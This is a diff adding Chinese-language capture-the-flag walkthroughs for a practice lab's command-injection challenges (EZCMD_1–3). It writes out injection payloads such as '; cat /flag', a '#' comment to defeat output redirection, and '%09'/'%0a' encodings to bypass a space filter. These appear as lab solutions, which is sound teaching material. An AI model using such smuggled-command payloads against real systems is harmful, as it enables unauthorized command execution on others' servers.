@@ -2412,9 +2412,129 @@ cmd=cat ../../../flag <br>
 	
 ></p>
 <h3 id="ezcmd_1">EZCMD_1
-</h3><h3 id="ezcmd_2">EZCMD_2
-</h3><h3 id="ezcmd_3">EZCMD_3
-</h3><h3 id="ezcmd_4">EZCMD_4
+</h3><p>访问靶机<br>
+<img src="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/cmd5.png"
+	width="655"
+	height="330"
+	srcset="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/cmd5_hu_e579742a4bb4f6b0.png 480w, /p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/cmd5_hu_ea5b7724dab6ad09.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="476px"
+	
+><br>
+分析条件<br>
+用户输入 $cmd 直接拼接到 system() 函数中<br>
+可以通过命令分隔符注入任意命令<br>
+cmd=; ls /<br>
+<img src="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/cmd6.png"
+	width="979"
+	height="552"
+	srcset="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/cmd6_hu_f3d9f954eff164d0.png 480w, /p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/cmd6_hu_d0fb30644f03879c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="425px"
+	
+><br>
+cmd=; cat /flag<br>
+<img src="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/cmd7.png"
+	width="746"
+	height="571"
+	srcset="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/cmd7_hu_586a05af136ce0a2.png 480w, /p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/cmd7_hu_8db2cb3cb36b504b.png 1024w"
+	loading="lazy"
+	
+		alt="获得flag"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="130"
+		data-flex-basis="313px"
+	
+></p>
+<h3 id="ezcmd_2">EZCMD_2
+</h3><p>访问靶机<br>
+<img src="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c9.png"
+	width="971"
+	height="554"
+	srcset="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c9_hu_114d2288a092a15b.png 480w, /p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c9_hu_6cb2c39eb0ed4867.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="420px"
+	
+><br>
+分析条件<br>
+system($cmd.&rdquo; &gt;/dev/null 2&gt;&amp;1&quot;)  用户输入在前，输出被重定向<br>
+可以利用注释符#绕过<br>
+<img src="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c9.png"
+	width="971"
+	height="554"
+	srcset="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c9_hu_114d2288a092a15b.png 480w, /p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c9_hu_6cb2c39eb0ed4867.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="420px"
+	
+><br>
+cmd=cat /flag #<br>
+<img src="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c10.png"
+	width="834"
+	height="562"
+	srcset="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c10_hu_a276b2e5686eb5e8.png 480w, /p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c10_hu_f21e2fb55332ab8a.png 1024w"
+	loading="lazy"
+	
+		alt="获得flag"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="356px"
+	
+></p>
+<h3 id="ezcmd_3">EZCMD_3
+</h3><p>访问靶机<br>
+<img src="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c11.png"
+	width="599"
+	height="338"
+	srcset="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c11_hu_2e353ce42c129ee7.png 480w, /p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c11_hu_df08342d2313e367.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="425px"
+	
+><br>
+分析条件<br>
+禁止空格字符<br>
+输出重定向到 /dev/null<br>
+%09 URL编码的Tab，Shell解析为分隔符<br>
+%0a URL编码的换行，使命令独立于重定向<br>
+cmd=cat%09/flag%0a<br>
+<img src="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c12.png"
+	width="1505"
+	height="305"
+	srcset="/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c12_hu_88cee145e768e68e.png 480w, /p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp/IMG/c12_hu_e10b9e6e0e73a48f.png 1024w"
+	loading="lazy"
+	
+		alt="获得flag"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="493"
+		data-flex-basis="1184px"
+	
+></p>
+<h3 id="ezcmd_4">EZCMD_4
 </h3><h3 id="ezcmd_5">EZCMD_5
 </h3><h3 id="ezcmd_6">EZCMD_6
 </h3><h3 id="ezcmd_7">EZCMD_7
